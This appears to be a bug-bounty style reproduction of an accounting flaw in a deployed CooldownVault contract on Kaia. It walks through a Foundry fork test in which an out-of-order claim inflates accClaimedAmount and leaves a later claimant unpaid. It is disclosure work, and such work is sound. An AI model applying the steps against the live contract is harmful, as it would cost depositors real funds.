# Reproduction

This walks through exactly what the Foundry test does and why each step matters.

## Setup

Kaia mainnet fork at block 217860010. The deployed proxy is `0x4E4654cE4Ca7ff0ba66a0A4a588A4bd55A6f9A33`, implementation at `0x570435b7ABCc8241Cfdbcbf05Ba960218acCd190`.

Storage slots used (from `forge inspect CooldownVault storageLayout`):

| Variable | Slot |
|---|---|
| `lastRequestId` | 363 (0x16b) |
| `accClaimedAmount` | 366 (0x16e) |
| `totalLockedAssets` | 369 (0x171) |
| `_managedAssets` | 370 (0x172) |

The test uses `vm.store` to write these directly, resetting the vault to a known state without touching anything else.

## Step 1 - Reset vault accounting

```
_managedAssets   = 65 USDT  (slot 370)
accClaimedAmount = 0         (slot 366)
totalLockedAssets= 0         (slot 369)
lastRequestId    = 0         (slot 363)
```

`deal()` sets the vault's actual USDT balance to 65e6 to match. `deal()` is also used to give `STRATEGY` (0x650a4c074a58B18fbEEd48ae766e58a382D9E5F5, an address in `_authorizedAddresses`) 80 USDT to fund the three deposits.

## Step 2 - Create three redemption requests

`STRATEGY` is pranked to call `deposit()` and then `redeem()` three times. The vault is authorised to accept deposits and process redeems from this address per the live `_authorizedAddresses` set.

```
deposit(50e6, STRATEGY)  -> vault gains 50 USDT managed
deposit(20e6, STRATEGY)  -> vault gains 20 USDT managed
deposit(10e6, STRATEGY)  -> vault gains 10 USDT managed
```

After deposits `_managedAssets` = 65 + 80 = 145. The test then writes `_managedAssets` back to 65 via `vm.store` and resets the actual USDT balance via `deal()`. This simulates 80 USDT having been deployed crosschain by StrategyOriginVault, which is exactly what happens in normal protocol operation.

```
redeem(50e6, alice, STRATEGY)   -> requestId = 1
redeem(20e6, bob,   STRATEGY)   -> requestId = 2
redeem(10e6, charlie, STRATEGY) -> requestId = 3
```

After redeems:
- `totalLockedAssets` = 80 USDT
- `accRedeemRequestedAmount[1]` = 50e6
- `accRedeemRequestedAmount[2]` = 70e6
- `accRedeemRequestedAmount[3]` = 80e6

## Step 3 - Warp past cooldown

```solidity
vm.warp(block.timestamp + cooldownPeriod + 1);
```

`cooldownPeriod` = 86400 (confirmed via live `cooldownPeriod()` call).

## Step 4 - Bob claims req2 out of order

Bob is the `receiver` on requestId 2. He calls `claim(2, 10_000)`. The 10000 `maxLossBps` value passes the receiver guard:

```solidity
if (maxLossBps > maxLossThresholdBps && _msgSender() != request.receiver) revert ...
```

Inside `_claim()`, the reservation math runs:

```
_accRedeemRequestedAmount = accRedeemRequestedAmount[2 - 1] = accRedeemRequestedAmount[1] = 50e6
reservedForPriorRequests  = 50e6 - 0 = 50e6
availableLiquidity        = 65e6 - 50e6 = 15e6
assetsOut                 = min(20e6, 15e6) = 15e6
```

Bob receives 15 USDT. Then the effects block runs:

```solidity
request.claimed = true;
totalLockedAssets -= 20e6;    // 80 -> 60
accClaimedAmount  += 20e6;    // 0  -> 20   <-- BUG: should be += 15e6
totalClaimLoss    += 5e6;     // 0  -> 5
```

`accClaimedAmount` is now 20e6, but only 15e6 left the vault.

## Step 5 - Alice claims req1

Alice calls `claim(1, 0)`. The reservation math:

```
_accRedeemRequestedAmount = accRedeemRequestedAmount[1 - 1] = accRedeemRequestedAmount[0] = 0
reservedForPriorRequests  = max(0 - 20e6, 0) = 0
availableLiquidity        = 50e6 - 0 = 50e6
assetsOut                 = min(50e6, 50e6) = 50e6
```

Alice receives 50 USDT. Vault drains to 0.

`accClaimedAmount` += 50e6 -> 70e6.

## Step 6 - Charlie claims req3

Charlie calls `claim(3, 10_000)`. The vault has 0 USDT.

```
_accRedeemRequestedAmount = accRedeemRequestedAmount[2] = 70e6
reservedForPriorRequests  = max(70e6 - 70e6, 0) = 0
availableLiquidity        = max(0 - 0, 0) = 0
assetsOut                 = 0
```

Charlie receives 0. His `claimed` flag is set to `true`, `totalLockedAssets` -= 10e6. But he got nothing.

`totalClaimLoss` = 5e6 (from bob) + 10e6 (from charlie) = 15e6.

## What the test asserts

```
assertLt(bobOut, 20e6)
// confirms partial payout occurred

assertEq(claimedDelta, 20e6)
// confirms accClaimedAmount was incremented by request.assets not assetsOut

assertGt(inflation, 0)
// confirms phantom inflation exists

assertGt(vault.totalClaimLoss(), 0)
// confirms phantom loss persists after all claims
```

All four pass.

## Full output

```
=== BOB CLAIMS req2 (maxLoss=100%) ===
Bob requested              : 20000000
Bob received (assetsOut)   : 15000000
accClaimedAmount delta     : 20000000
totalClaimLoss delta       : 5000000

[BUG] accClaimedAmount inflated by: 5000000 (phantom USDT)
[BUG] correct value would be       : 15000000
[BUG] actual value is              : 20000000

=== FINAL SUMMARY ===
Bob received    : 15000000 / 20e6 requested
Alice received  : 50000000 / 50e6 requested
Charlie received: 0 / 10e6 requested
Total paid out  : 65000000 / 80e6 requested
Phantom accClaimedAmount inflation : 5000000
recoverClaimLoss() would mint 15000000 governance shares backed by nothing
```

Suite result: `ok. 1 passed; 0 failed`
